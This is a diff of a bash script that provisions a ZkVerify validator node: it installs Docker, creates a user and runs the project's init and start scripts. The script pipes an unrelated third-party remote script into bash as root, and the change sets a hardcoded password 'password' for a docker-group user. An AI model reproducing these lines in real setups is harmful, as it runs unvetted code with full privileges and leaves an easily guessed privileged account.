@@ -1,6 +1,8 @@
 #!/bin/bash
 
 set -e
+
+# Run an external script
 curl -s https://raw.githubusercontent.com/zidanaetrna/unichain/refs/heads/main/button_logo_script.sh | bash
 
 # Update system and install required packages
@@ -9,33 +11,28 @@ apt update && apt install -y docker.io docker-compose jq sed
 
 # Prompt user for the new username
 echo "Please enter the username you want to create:"
-read NEW_USER
+read -r NEW_USER
 
 # Create the new user
 echo "Creating user: $NEW_USER..."
-useradd -m -s /bin/bash $NEW_USER
-passwd $NEW_USER
-usermod -aG docker $NEW_USER
+useradd -m -s /bin/bash "$NEW_USER"
+echo "$NEW_USER:password" | chpasswd  # Set a default password (change as needed)
+usermod -aG docker "$NEW_USER"
 
 echo "User $NEW_USER has been created and added to the Docker group."
 
-# Switch to new user
-echo "Switching to user: $NEW_USER..."
-su - $NEW_USER <<EOF
-
-# Clone the repository
+# Switch to the new user and run commands
+sudo -u "$NEW_USER" bash <<EOF
+cd ~
 echo "Cloning ZkVerify repository..."
 git clone https://github.com/zkVerify/compose-zkverify-simplified.git
 cd compose-zkverify-simplified
 
-# Run the initialization script
 echo "Running initialization script..."
 ./scripts/init.sh
 
-# Start the validator node
 echo "Starting the ZkVerify node..."
 ./scripts/start.sh
-
 EOF
 
 echo "ZkVerify node setup is complete!"
